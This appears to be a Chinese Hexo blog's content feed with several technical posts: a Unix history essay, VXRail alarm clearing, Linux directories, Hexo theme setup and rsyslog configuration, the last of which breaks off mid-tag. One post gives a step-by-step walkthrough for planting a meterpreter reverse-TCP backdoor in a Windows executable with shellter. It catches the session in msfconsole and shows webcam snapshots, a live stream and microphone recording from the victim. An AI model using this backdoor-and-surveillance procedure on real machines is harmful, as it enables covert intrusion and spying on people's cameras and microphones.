的岁月里，大伙为了科研目的或个人兴趣在 Unix 上进行各种开发，并且不计较金钱利益，将这些源码公开，互相共享。在那里，开发和自由成为主题，正因为如此，当今的世界才如此丰富多采。在 40 年 Unix 文化和技术积淀的里面，蕴涵着比较纯正的计算机文化和思想。</p><p>纵观整个 Unix 的历史过程中，许许多多的程序员、工程师前辈们在 Unix 中所摸爬滚打，他们的辛勤地、他们呕心沥血地跟随 Unix，努力建立一个繁荣的计算机世界的文明。Unix 不是一个简简单单的操作系统。有人说，Unix 是程序员设计给程序员的，一点没错。Unix 的近40年历史造就了它的博大精深，它给程序员们带来的绝不仅仅只是技术上的知识。它的失误，它的无奈，它的精神，它的荣耀，它从技术和思想上都启迪着我们。对于程序员来说，学习 Unix 就等同于向前辈程序学习。无论你是什么样的程序员，你都应该了解 Unix，这是开发人员的根，前面的开发者造就了它，而它又在引领后面的开发人员，它是前辈程序员们交给我们的一份礼物，一个接力棒，它是开发人员赖以生存的土壤，是上一辈程序员留给我们这一代程序员开启未来的钥匙。Unix 就像一个程序员教父一样，理当受到我们的尊敬和崇拜。</p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://blog.csdn.net/haoel/article/details/1542340" target="_blank" rel="noopener">Unix传奇（上篇）</a></p><p><a href="https://blog.csdn.net/iteye_3952/article/details/81440521" target="_blank" rel="noopener">Unix传奇（下篇）</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VXRail清除假警报</title>
      <link href="/2019/08/27/VXRail%E6%B8%85%E9%99%A4%E5%81%87%E6%8A%A5%E8%AD%A6/"/>
      <url>/2019/08/27/VXRail%E6%B8%85%E9%99%A4%E5%81%87%E6%8A%A5%E8%AD%A6/</url>
      
        <content type="html"><![CDATA[<h1 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h1><ol><li>VXRail 服务器闪黄灯</li><li>VXrail Manager 出现 MYSTIC028005 警报</li></ol><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol><li>登陆到 VXrail Manager，查看是哪个节点报错，并点击“感叹号”，找到相应的主机。</li></ol><p><img src="https://i.loli.net/2019/08/30/rgDWS8mOE9KIkCF.png" alt="vxrail-9.png"></p><p><img src="https://i.loli.net/2019/08/30/yi7JFfIt4GEmh8O.png" alt="vxrail-10.png"></p><ol start="2"><li>找到对应的主机，选择 “监控” —&gt; “硬件状态” —&gt; “传感器” —&gt; “基线版管理控制器”</li></ol><p><img src="https://i.loli.net/2019/08/27/mScTquMZtzaJViY.png" alt="vxrail-1.png"></p><ol start="3"><li>展开“基线版管理控制器”，找到 BMC 地址</li></ol><p><img src="https://i.loli.net/2019/08/27/HDFBwSVA5Mb1lgY.png" alt="vxrail-2.png"></p><ol start="4"><li>登陆到 BMC，在 dashboard 界面找到 “Sensor Monitoring”。服务状态全是绿的，说明服务正常运行，出现的警告是假警告</li></ol><p><img src="https://i.loli.net/2019/08/27/8cfRl3DGVzsIdqM.png" alt="vxrail-3.png"></p><ol start="5"><li>清除 BMC 的日志</li></ol><p><img src="https://i.loli.net/2019/08/27/RdbFHfMcj1Y4X3r.png" alt="vxrail-5.png"></p><p><img src="https://i.loli.net/2019/08/27/n4I8zxomXvLlOSU.png" alt="vxrail-6.png"></p><ol start="6"><li>编辑主机的“安全配置文件”，开启 SSH 服务</li></ol><p><img src="https://i.loli.net/2019/08/30/VABKd5ozschxfYi.png" alt="vxrail-11.png"></p><p><img src="https://i.loli.net/2019/08/27/qzC1fYjQyr6uLGW.png" alt="vxrail-4.png"></p><ol start="7"><li>通过xshell连接到主机，并执行以下命令。清除记录并重启 BMC</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ntzyy06:~<span class="token punctuation">]</span> /tmp/vspexblue/bin/ipmitool sel <span class="token function">clear</span><span class="token punctuation">[</span>root@ntzyy06:~<span class="token punctuation">]</span> /tmp/vspexblue/bin/ipmitool mc reset cold</code></pre><p><img src="https://i.loli.net/2019/08/27/WXjTnG2vw61IBEK.png" alt="vxrail-7.png"></p><ol start="8"><li>再次登陆到 VXRail，并检查服务器还有没有警告。</li></ol><p><img src="https://i.loli.net/2019/08/27/aI83CvlnhJHbcuN.png" alt="vxrail-8.png"></p><p>注：这个问题通常发生在低版本的Quanta节点上，且现在运行的版本过于老旧，所以建议进行系统升级。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> HCI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vxrail </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux目录架构</title>
      <link href="/2019/08/24/linux%E7%9B%AE%E5%BD%95%E6%9E%B6%E6%9E%84/"/>
      <url>/2019/08/24/linux%E7%9B%AE%E5%BD%95%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<pre class=" language-bash"><code class="language-bash">/├── bin -<span class="token operator">></span> usr/bin                  //存放系统管理员及普通用户使用的命令和可执行的二进制文件├── boot                            //存放启动 linux 时使用的一些内核文件和引导程序文件├── dev                             //访问外部设备文件的接口（相当于识别出设备，但无法访问）├── etc                             //存放系统配置文件和子目录├── home                            //存放系统用户目录├── lib -<span class="token operator">></span> usr/lib                  //存放 32 位系统使用函数库目录（类似 windows 中的 DLL 文件）├── lib64 -<span class="token operator">></span> usr/lib64              //存放 64 位系统使用函数库目录├── media                           //自动识别挂载设备（如：U盘、移动硬盘等）├── mnt                             //让管理员手动挂载临时媒体设备├── opt                             //存放系统额外安装的软件├── proc                            //它是一个虚拟目录，映射系统的内存信息，通常直接访问这个目录来获取系统信息。├── root                            //超级用户主目录├── run                             //一个临时文件系统，存储系统启动的信息，当系统重启时，这个目录下的文件会被删掉除。├── sbin -<span class="token operator">></span> usr/sbin                //存放系统管理员使用的可执行命令├── srv                             //存放一些服务启动之后需要提取的数据（例如www服务启动后，数据就会存放在/srv/www内）├── sys                             //存放sysfs文件系统，用户科通过访问这个目录，来查看内核驱动及设备等├── tmp                             //存放临时文件├── usr                             //用户的应用程序存放目录└── var                             //存放系统执行过程中经常变化的文件（如：日志文件、登录文件、邮件文件等）</code></pre><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://blog.csdn.net/m0_38044196/article/details/72844025" target="_blank" rel="noopener">Linux目录结构及详细介绍</a></p><p><a href="https://blog.csdn.net/wangyanlong0107/article/details/84926398" target="_blank" rel="noopener">【转】/mnt /media /dev 目录区别</a></p><p><a href="https://blog.csdn.net/luckywang1103/article/details/25715101" target="_blank" rel="noopener">linux /sys目录下的各个子目录说明</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Directory </tag>
            
            <tag> architecture </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用反向shell控制摄像头</title>
      <link href="/2019/08/22/%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91shell%E6%8E%A7%E5%88%B6%E6%91%84%E5%83%8F%E5%A4%B4/"/>
      <url>/2019/08/22/%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%90%91shell%E6%8E%A7%E5%88%B6%E6%91%84%E5%83%8F%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>系统：Kali、windows 10 （电脑上带摄像头）</p><p>软件：shellter（kali 默认安装）</p><p>注：关闭防火墙和杀毒软件</p><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><ol><li><p>将任意 PE 软件，放到 Kali 系统中</p></li><li><p>运行 shellter</p></li></ol><pre class=" language-bash"><code class="language-bash">root@kali:/home/SHELL<span class="token comment" spellcheck="true"># shellter</span></code></pre><ol start="3"><li>在 shellter 弹窗中输入 A（Auto，自动添加后门），第二行输入 PE 软件的存放路径</li></ol><p><img src="https://i.loli.net/2019/08/23/hcHEKL9xQfSklXF.png" alt="shellter-1.png"></p><ol start="4"><li>这里提示：是否添加一个后门模块，这里选择 “ Y “ </li></ol><p><img src="https://i.loli.net/2019/08/23/Vrxq6Fpu8G3gWlf.png" alt="shellter-2.png"></p><ol start="5"><li>首先输入 “ L “ ，然后输入模块编号 “ 1 “（meterpreter_reverse_tcp）,最后输入我们需要监听的  地址（kali 系统的ip）和端口号。</li></ol><p><img src="https://i.loli.net/2019/08/23/7fQZB8Xbke5gHNd.png" alt="shellter-3.png"></p><ol start="6"><li>末尾没有报错，说明后门已经写入成功</li></ol><p><img src="https://i.loli.net/2019/08/23/xy1pjkw38lMtZSd.png" alt="shellter-4.png"></p><ol start="7"><li>打开 msf，并监听地址和端口</li></ol><pre class=" language-bash"><code class="language-bash">root@kali:/home/SHELL<span class="token comment" spellcheck="true"># msfconsole</span>msf5 <span class="token operator">></span> use multi/handlermsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LHOST 192.168.124.26LHOST <span class="token operator">=</span><span class="token operator">></span> 192.168.124.26msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LPORT 4444LPORT <span class="token operator">=</span><span class="token operator">></span> 4444msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> run</code></pre><ol start="8"><li><p>将添加好后门的 PE 软件，放到 windows 10 系统中并运行。 </p></li><li><p>msf 监听到了会话，并进行摄像头操作</p></li></ol><pre class=" language-bash"><code class="language-bash">// ** 将添加了后门的软件，放到 windwos 中，并运行.出现如下内容，说明反向shell已经成功 ** //<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.168.124.26:4444 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>179779 bytes<span class="token punctuation">)</span> to 192.168.124.25<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>192.168.124.26:4444 -<span class="token operator">></span> 192.168.124.25:1773<span class="token punctuation">)</span> at 2019-08-23 00:40:53 +0800// ** 查看摄像头 ** //meterpreter <span class="token operator">></span> webcam_list1: Chicony USB2.0 Camera// ** 用摄像头进行拍照 ** //meterpreter <span class="token operator">></span> webcam_snap -i 1<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting<span class="token punctuation">..</span>.<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Got frame<span class="token punctuation">[</span>*<span class="token punctuation">]</span> StoppedWebcam shot saved to: /root/sUqFcfWF.jpegmeterpreter <span class="token operator">></span> gimp_device_info_set_device: trying to <span class="token keyword">set</span> GdkDevice <span class="token string">'VirtualPS/2 VMware VMMouse'</span> on GimpDeviceInfo <span class="token function">which</span> already has a device// ** 录制声音 ** //meterpreter <span class="token operator">></span>  record_mic<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting<span class="token punctuation">..</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> StoppedAudio saved to: /root/fSAEXVSs.wav// ** 开启摄像头（在 /var/www//webcam.htm 中可以看到截取的图片） ** //meterpreter <span class="token operator">></span> run webcam -p /var/www/<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try post/windows/manage/webcam.<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run post/windows/manage/webcam OPTION<span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting webcam 1: Chicony USB2.0 Camera<span class="token punctuation">[</span>*<span class="token punctuation">]</span> imagepath is /var/www//webcam-00000.jpg<span class="token punctuation">[</span>*<span class="token punctuation">]</span> View live stream at: /var/www//webcam.htm<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Image saved to <span class="token keyword">:</span> /var/www//webcam-00000.jpg<span class="token punctuation">[</span>8243:8243:0823/004940.714044:ERROR:zygote_host_impl_linux.cc<span class="token punctuation">(</span>89<span class="token punctuation">)</span><span class="token punctuation">]</span> Running as root without --no-sandbox is not supported. See https://crbug.com/638180// ** 关闭摄像头 ** //run webcam -s</code></pre><p><strong></strong></p><center><strong>不得将本文用作违法犯罪目的，本文只用作技术分享交流学习使用。</strong></center><p></p><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.freebuf.com/articles/system/209261.html" target="_blank" rel="noopener">使用反向Shell控制摄像头</a></p><p><a href="https://www.cnblogs.com/Sunben/p/10574924.html" target="_blank" rel="noopener">meterpreter后渗透之摄像头和录音详细用法</a></p><p><a href="https://bbs.ichunqiu.com/thread-25177-1-1.html" target="_blank" rel="noopener">屌丝绅士-后门捆绑工具-shellter</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> system security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> shellter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo-next主题优化</title>
      <link href="/2019/08/08/hexo-next%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/"/>
      <url>/2019/08/08/hexo-next%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="设置主题样式"><a href="#设置主题样式" class="headerlink" title="设置主题样式"></a>设置主题样式</h1><ol><li>修改 themes\next\_config.yml</li></ol><pre class=" language-yml"><code class="language-yml"># Schemes#scheme: Muse# scheme: Mistscheme: Pisces#scheme: Gemini</code></pre><h1 id="添加标签（tags）和分类页面（categories）"><a href="#添加标签（tags）和分类页面（categories）" class="headerlink" title="添加标签（tags）和分类页面（categories）"></a>添加标签（tags）和分类页面（categories）</h1><ol><li>开启 tags 和 categories<br>修改 themes\next\_config.yml ，将 tags 和 categories 前的 “#” 删掉</li></ol><pre class=" language-yml"><code class="language-yml">menu:  home: / || home  # about: /about/ || user  tags: /tags/ || tags  categories: /categories/ || th  archives: /archives/ || archive  # schedule: /schedule/ || calendar  # sitemap: /sitemap.xml || sitemap  # commonweal: /404/ || heartbeat</code></pre><ol start="2"><li>生成页面</li></ol><pre class=" language-bash"><code class="language-bash">$ hexo new page tagsINFO  Created: E:\My_Blog\source\tags\index.md$ hexo new page categoriesINFO  Created: E:\My_Blog\source\categories\index.md</code></pre><ol start="3"><li>分别修改 index.md</li></ol><pre><code>---title: tagsdate: 2019-08-09 10:41:40type: "tags"---</code></pre><pre><code>---title: categoriesdate: 2019-08-09 10:43:31type: "categories"---</code></pre><ol start="3"><li>检查页面配置<br>开启本地的 hexo 服务，并查看页面配置</li></ol><pre class=" language-bash"><code class="language-bash">$ hexo s</code></pre><p>注：hexo 默认配置了首页（home）和归档（archives）页面，其他新开的页面需要自己手动生成。</p><h1 id="添加本地搜索"><a href="#添加本地搜索" class="headerlink" title="添加本地搜索"></a>添加本地搜索</h1><ol><li>安装 hexo-generator-search</li></ol><pre class=" language-bash"><code class="language-bash">$  <span class="token function">npm</span> <span class="token function">install</span> hexo-generator-search --save</code></pre><ol start="2"><li>开启本地搜索，将 “enable: “ 的值改为 “true”</li></ol><pre class=" language-yml"><code class="language-yml"># Local search# Dependencies: https://github.com/theme-next/hexo-generator-searchdblocal_search:  enable: true  # If auto, trigger search by changing input.  # If manual, trigger search by pressing enter key or search button.  trigger: auto  # Show top n results per article, show all results by setting to -1  top_n_per_article: 1  # Unescape html strings to the readable one.  unescape: false  # Preload the search data when the page loads.  preload: false</code></pre><h1 id="添加背景特效"><a href="#添加背景特效" class="headerlink" title="添加背景特效"></a>添加背景特效</h1><ol><li>安装 theme-next-canvas-nest</li></ol><pre class=" language-bash"><code class="language-bash">$ <span class="token function">cd</span> themes/next$ <span class="token function">git</span> clone https://github.com/theme-next/theme-next-canvas-nest source/lib/canvas-nest</code></pre><ol start="2"><li>开启 canvas_nest 背景特效，将 “enable: “ 的值改为 “true”</li></ol><pre class=" language-yml"><code class="language-yml">canvas_nest:  enable: true  onmobile: true # display on mobile or not  color: '0,0,255' # RGB values, use ',' to separate  opacity: 0.5 # the opacity of line: 0~1  zIndex: -1 # z-index property of the background  count: 99 # the number of lines</code></pre><h1 id="设置加载进度样式"><a href="#设置加载进度样式" class="headerlink" title="设置加载进度样式"></a>设置加载进度样式</h1><ol><li>安装 heme-next-pace</li></ol><pre class=" language-bash"><code class="language-bash">$ <span class="token function">cd</span> themes/next$ <span class="token function">git</span> clone https://github.com/theme-next/theme-next-pace source/lib/pace</code></pre><ol start="2"><li>开启 pace ，”theme:” 设置进度条样式</li></ol><pre class=" language-yml"><code class="language-yml"># Progress bar in the top during page loading.# Dependencies: https://github.com/theme-next/theme-next-pace# For more information: https://github.com/HubSpot/pacepace:  enable: true  # Themes list:  # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | center-simple  # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material | minimal  theme: corner-indicator</code></pre><h1 id="设置侧边栏"><a href="#设置侧边栏" class="headerlink" title="设置侧边栏"></a>设置侧边栏</h1><ol><li>修改 themes\next\_config.yml</li></ol><pre class=" language-yml"><code class="language-yml">sidebar:  # 侧边栏位置  # Sidebar Position.  position: left  #position: right  # 侧边栏大小  # Manual define the sidebar width. If commented, will be default for:  # Muse | Mist: 320  Pisces | Gemini: 400  width: 300</code></pre><h1 id="添加头像"><a href="#添加头像" class="headerlink" title="添加头像"></a>添加头像</h1><ol><li>修改 themes\next\_config.yml</li></ol><pre class=" language-yml"><code class="language-yml"># Sidebar Avataravatar:  # In theme directory (source/images): /images/avatar.gif  # In site directory (source/uploads): /uploads/avatar.gif  # You can also use other linking images.  # 头像最好本地存放，存储位置在 themes\next\source\images  url: /images/tx1.jpg  # If true, the avatar would be dispalyed in circle.  rounded: false  # If true, the avatar would be rotated with the cursor.  rotated: false</code></pre><ol start="2"><li>设置头像旋转效果</li></ol><p>将文件 themes\next\source\css_common\components\sidebar 的内容替换</p><pre class=" language-yml"><code class="language-yml">.site-author-image {  display: block;  margin: 0 auto;  padding: $site-author-image-padding;  max-width: $site-author-image-width;  height: $site-author-image-height;  border: $site-author-image-border-width solid $site-author-image-border-color;  border-radius: 60%;  transition: 2.5s all;  }.site-author-image:hover {    transform: rotate(360deg);}.site-author-name {  margin: $site-author-name-margin;  text-align: $site-author-name-align;  color: $site-author-name-color;  font-weight: $site-author-name-weight;}.site-description {  margin-top: $site-description-margin-top;  text-align: $site-description-align;  font-size: $site-description-font-size;  color: $site-description-color;}</code></pre><h1 id="博客总访问量"><a href="#博客总访问量" class="headerlink" title="博客总访问量"></a>博客总访问量</h1><ol><li>修改 themes\next\_config.yml<pre class=" language-yml"><code class="language-yml"># Show Views / Visitors of the website / page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzibusuanzi_count:enable: truetotal_visitors: truetotal_visitors_icon: usertotal_views: truetotal_views_icon: eyepost_views: truepost_views_icon: eye</code></pre></li><li>在 themes\next\layout\_partials\footer.swig 中添加如下内容</li></ol><pre class=" language-yml"><code class="language-yml"><div><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_pv" style='display:none'>    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次    <span class="post-meta-divider">|</span></span><span id="busuanzi_container_site_uv" style='display:none'>    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦</span></div></code></pre><h1 id="设置代码样式"><a href="#设置代码样式" class="headerlink" title="设置代码样式"></a>设置代码样式</h1><ol><li>修改 themes\next\_config.yml</li></ol><pre class=" language-yml"><code class="language-yml">codeblock:  # Code Highlight theme  # Available values: normal | night | night eighties | night blue | night bright  # See: https://github.com/chriskempson/tomorrow-theme  highlight_theme: night  # Add copy button on codeblock  copy_button:    enable: true    # Show text copy result.    show_result: true    # Available values: default | flat | mac    style: flat</code></pre><h3 id="hexo-next-主题将首页文章设为预览"><a href="#hexo-next-主题将首页文章设为预览" class="headerlink" title="hexo next 主题将首页文章设为预览"></a>hexo next 主题将首页文章设为预览</h3><p>编辑 themes/next 目录下的 _config.yml 文件,搜索 “auto_excerpt” 关键字，并修改位如下内容：</p><pre class=" language-yml"><code class="language-yml"># Automatically Excerpt. Not recommand.# Please use <!-- more --> in the post to control excerpt accurately.auto_excerpt:  enable: true  length: 150   # 文章预览的文本长度</code></pre><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://blog.pangao.vip/Hexo%E5%8D%9A%E5%AE%A2NexT%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96%E4%B9%8B%E9%A1%B6%E9%83%A8%E5%8A%A0%E8%BD%BD%E8%BF%9B%E5%BA%A6%E6%9D%A1/" target="_blank" rel="noopener">Hexo博客NexT主题美化之顶部加载进度条</a></p><p><a href="https://github.com/theme-next/theme-next-pace">theme-next-pace</a></p><p><a href="https://theme-next.org/docs/theme-settings/sidebar" target="_blank" rel="noopener">sidebar</a></p><p><a href="https://blog.csdn.net/weixin_39345384/article/details/80785373" target="_blank" rel="noopener">Hexo框架下用NexT(v7.0+)主题美化博客</a></p><p><a href="https://www.jianshu.com/p/3a05351a37dc" target="_blank" rel="noopener">Hexo的Next主题详细配置</a></p><p><a href="http://theme-next.iissnan.com/theme-settings.html" target="_blank" rel="noopener">主题配置</a></p><p><a href="https://hexo.io/plugins/" target="_blank" rel="noopener">hexo plugins</a></p><p><a href="https://www.jianshu.com/p/393d067dba8d" target="_blank" rel="noopener">Hexo之next主题设置首页不显示全文(只显示预览)</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> theme-next </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rsyslog服务器搭建</title>
      <link href="/2019/08/06/rsyslog%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/08/06/rsyslog%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><h2 id="服务器："><a href="#服务器：" class="headerlink" title="服务器："></a>服务器：</h2><p>centos6.5（默认安装rsyslog）<br>IP：192.168.0.101</p><h2 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h2><p>centos6.5<br>IP：192.168.0.105</p><p>前提要配置好 服务器 和 客户端 的网络，让它们能上网</p><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h1><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><ol><li>查看 rsyslog 的版本</li></ol><pre class=" language-bash"><code class="language-bash"> <span class="token comment" spellcheck="true"># rsyslogd -v</span></code></pre><ol start="2"><li>防火墙配置</li></ol><pre class=" language-bash"><code class="language-bash"> <span class="token comment" spellcheck="true"># vim /etc/sysconfig/iptables</span>//** 添加如下内容 **//-A INPUT -m state --state NEW -m tcp -p tcp --dport 514 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 3306 -j ACCEPT</code></pre><ol start="3"><li>重启防火墙</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># services iptables restart</span></code></pre><ol start="4"><li>关闭 selinux</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># sed -i 's/enforcing/disabled/' /etc/selinux/config</span></code></pre><ol start="5"><li>安装 lamp</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># yum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml mysql mysql-server wget gcc c++ -y</span></code></pre><ol start="6"><li>添加开机自启动项</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># chkconfig httpd on</span><span class="token comment" spellcheck="true"># chkconfig mysqld on </span><span class="token comment" spellcheck="true"># chkconfig rsyslog on </span></code></pre><ol start="7"><li>配置 httpd</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># vim /etc/httpd/conf/httpd.conf</span>ServerName 127.0.0.1:80    //** 编辑 ServerName example.com:80 **////** 在 639行添加如下内容 **//AddType application/x-httpd-php .phpAddType application/x-httpd-php-source .phps</code></pre><ol start="8"><li>开启服务</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># service httpd start</span><span class="token comment" spellcheck="true"># service mysqld start</span><span class="token comment" spellcheck="true"># service rsyslog start</span></code></pre><ol start="9"><li>安装Rsyslog支持数据库支持</li></ol><pre class=" language-bash"><code class="language-bash">yum <span class="token function">install</span> rsyslog-mysql -y</code></pre><ol start="10"><li>测试是不是支持php</li></ol><pre class=" language-bash"><code class="language-bash">vim /var/www/html/index.php <span class="token operator">&lt;</span>?phpphpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre><ol start="11"><li>在网页上输入服务器 IP 地址，测试 lamp 是否配置成功<br><img src="https://i.loli.net/2019/08/06/NM9VZP8LFJdcRBY.png" alt="rsylog-1.png"></li></ol><ol start="12"><li>查看是否有数据库文件 createDB.sql</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># ll /usr/share/doc/rsyslog-mysql-5.8.10/createDB.sql</span></code></pre><ol start="13"><li>导入 createDB.sql 文件到数据库中</li></ol><pre class=" language-bash"><code class="language-bash">mysql -u root -p <span class="token operator">&lt;</span> /usr/share/doc/rsyslog-mysql-5.8.10/createDB.sql</code></pre><ol start="14"><li>进入数据库，查看是否有 Syslog 数据库</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># mysql -uroot -p</span>mysql<span class="token operator">></span> show databases<span class="token punctuation">;</span>+--------------------+<span class="token operator">|</span> Database           <span class="token operator">|</span>+--------------------+<span class="token operator">|</span> information_schema <span class="token operator">|</span><span class="token operator">|</span> Syslog             <span class="token operator">|</span><span class="token operator">|</span> mysql              <span class="token operator">|</span><span class="token operator">|</span> <span class="token function">test</span>               <span class="token operator">|</span>+--------------------+4 rows <span class="token keyword">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span>0.00 sec<span class="token punctuation">)</span></code></pre><ol start="15"><li>Mysql数据库建立一个用户，并制授权用户给上面导入时建立的库Syslog所有权限</li></ol><pre class=" language-bash"><code class="language-bash">mysql<span class="token operator">></span> grant all privileges on Syslog.* to <span class="token string">'rsyslog'</span>@<span class="token string">'localhost'</span> identified by <span class="token string">'syslogps'</span><span class="token punctuation">;</span> mysql<span class="token operator">></span> grant all privileges on Syslog.* to <span class="token string">'rsyslog'</span>@<span class="token string">'127.0.0.1'</span> identified by <span class="token string">'syslogps'</span><span class="token punctuation">;</span> mysql<span class="token operator">></span> flush privileges<span class="token punctuation">;</span></code></pre><ol start="16"><li>修改 rsyslog 配置文件</li></ol><pre class=" language-bash"><code class="language-bash">//** 删除前面的 “\#” **//<span class="token variable">$ModLoad</span> imtcp<span class="token variable">$InputTCPServerRun</span> 514//** 添加如下两行 **//<span class="token variable">$ModLoad</span> ommysql*.* :ommysql:127.0.0.1,Syslog,rsyslog,syslogps  //** 这里的 *.* 表示任意用户名，127.0.0.1 数据库的 ip地址（根据自己的环境做调整） Syslog 是数据库，rsyslog 是数据库授权的用户名，syslogps 是密码。 **//</code></pre><ol start="17"><li>重启服务</li></ol><pre class=" 